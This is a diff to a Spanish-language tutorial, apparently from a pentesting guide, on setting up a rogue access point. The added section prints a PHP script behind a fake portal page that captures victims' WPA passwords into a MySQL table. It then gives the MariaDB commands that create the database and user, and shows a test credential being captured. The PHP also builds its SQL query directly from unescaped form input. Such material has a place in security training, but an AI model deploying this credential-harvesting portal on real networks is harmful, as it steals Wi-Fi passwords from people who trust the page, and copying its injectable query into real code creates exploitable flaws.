@@ -3239,7 +3239,9 @@ range 192.168.1.130 192.168.1.140;
 }
 ```
 
-En este fichero, indicamos que el promedio de vida mínimo será de 600 segundos y el máximos de 7200. Entre este rango, una vez pasado el tiempo estimado se asignará una nueva IP al cliente (simplemente por hacerla dinámica).
+En este fichero, indicamos que el promedio de vida mínimo será de 600 segundos y el máximos de 7200. Entre
+este rango, una vez pasado el tiempo estimado se asignará una nueva IP al cliente asociado a nuestro
+AP (simplemente por hacerla dinámica).
 
 Para evitar entrar en conflicto con la topología de mi red real, como la pasarela es la 192.168.1.1 y algunos de los equipos están configurados en el rango del 192.168.1.2 al 192.168.1.100, lo que he hecho ha sido asignar un nuevo segmento, comprendido entre el rango 192.168.1.130 hasta el 192.168.1.140. Asignaremos como máscara de red la 255.255.255.128 y como nueva pasarela la 192.168.1.129. Todo esta configuración será gestionada por una nueva interfaz que crearemos en breve.
 
@@ -3267,6 +3269,147 @@ Posteriormente comprobamos que nuestro servidor web funciona correctamente:
 
 Todo este diseño es personalizable y se puede retocar sin ningún tipo de problema desde el HTML. En mi caso,
 lo voy a dejar así.
+
+#### Creación de base de datos via MYSQL
+
+Ahora bien, si nos fijamos en el **ACTION** del HTML principal, nos encontramos con esto:
+
+```bash
+┌─[root@parrot]─[/var/www/html]
+└──╼ #cat index.html | grep action
+            <tr><td><form action="dbconnect.php" method="post">
+┌─[root@parrot]─[/var/www/html]
+└──╼ #cat dbconnect.php 
+<?php
+session_start();
+ob_start();
+$host="localhost";
+$username="fakeap";
+$pass="fakeap";
+$dbname="rogue_AP";
+$tbl_name="wpa_keys";
+
+// Create connection
+$conn = mysqli_connect($host, $username, $pass, $dbname);
+// Check connection
+if (!$conn) {
+    die("Connection failed: " . mysqli_connect_error());
+}
+
+
+$password1=$_POST['password1'];
+$password2=$_POST['password2'];
+
+$sql = "INSERT INTO wpa_keys (password1, password2) VALUES ('$password1', '$password2')";
+if (mysqli_query($conn, $sql)) {
+    echo "New record created successfully";
+} else {
+    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
+}
+
+mysqli_close($conn);
+
+sleep(2);
+header("location:upgrading.html");
+ob_end_flush();
+?>
+```
+
+El **action** viene definido por el fichero **dbconnect.php**, el cual si nos fijamos, lleva a cabo una
+autenticación a través del servicio **MYSQL** a una tabla y base de datos que no existen. Por tanto, hay que
+crearla.
+
+Crear la base de datos en este caso es bastante sencillo:
+
+```bash
+┌─[root@parrot]─[/var/www/html]
+└──╼ #mysql -uroot
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 32
+Server version: 10.1.37-MariaDB-3 Debian buildd-unstable
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> create database rogue_AP;
+Query OK, 1 row affected (0.00 sec)
+
+MariaDB [(none)]> use rogue_AP;
+Database changed
+MariaDB [rogue_AP]> create table wpa_keys(password1 varchar(32), password2 varchar(32));
+Query OK, 0 rows affected (0.40 sec)
+
+MariaDB [rogue_AP]> show tables
+    -> ;
++--------------------+
+| Tables_in_rogue_AP |
++--------------------+
+| wpa_keys           |
++--------------------+
+1 row in set (0.00 sec)
+
+MariaDB [rogue_AP]> describe wpa_keys;
++-----------+-------------+------+-----+---------+-------+
+| Field     | Type        | Null | Key | Default | Extra |
++-----------+-------------+------+-----+---------+-------+
+| password1 | varchar(32) | YES  |     | NULL    |       |
+| password2 | varchar(32) | YES  |     | NULL    |       |
++-----------+-------------+------+-----+---------+-------+
+2 rows in set (0.00 sec)
+
+MariaDB [rogue_AP]> 
+```
+
+Una vez creada, ya podemos insertar valores en ella:
+
+```bash
+MariaDB [rogue_AP]> insert into wpa_keys(password1, password2) values ("test", "test");
+Query OK, 1 row affected (0.12 sec)
+
+MariaDB [rogue_AP]> select *from wpa_keys;
++-----------+-----------+
+| password1 | password2 |
++-----------+-----------+
+| test      | test      |
++-----------+-----------+
+1 row in set (0.00 sec)
+
+MariaDB [rogue_AP]> 
+```
+
+Si probamos a introducir las credenciales desde la página web, vemos que nos encontramos con el siguiente error:
+
+`Connection failed: Access denied for user 'fakeap'@'localhost'`
+
+Lo cual es normal, pues está intentando autenticar contra la base de datos haciendo uso del usuario
+**fakeap**, el cual no está creado. Por tanto, lo creamos y asignamos máximos privilegios sobre la base de datos creada:
+
+```bash
+MariaDB [rogue_AP]> create user fakeap@localhost identified by 'fakeap';
+Query OK, 0 rows affected (0.00 sec)
+
+MariaDB [rogue_AP]> grant all privileges on rogue_AP.* to 'fakeap'@'localhost';
+Query OK, 0 rows affected (0.00 sec)
+```
+
+Y ahora ya tras introducir las credenciales desde la web, veremos que estas son introducidas en nuestra base de datos:
+
+```bash
+MariaDB [rogue_AP]> select *from wpa_keys;
++------------------+------------------+
+| password1        | password2        |
++------------------+------------------+
+| test             | test             |
+| pruebadesdelaweb | pruebadesdelaweb |
++------------------+------------------+
+2 rows in set (0.00 sec)
+
+MariaDB [rogue_AP]> 
+```
+
+#### Creación de falso punto de acceso via Airbase
+
 
 
 
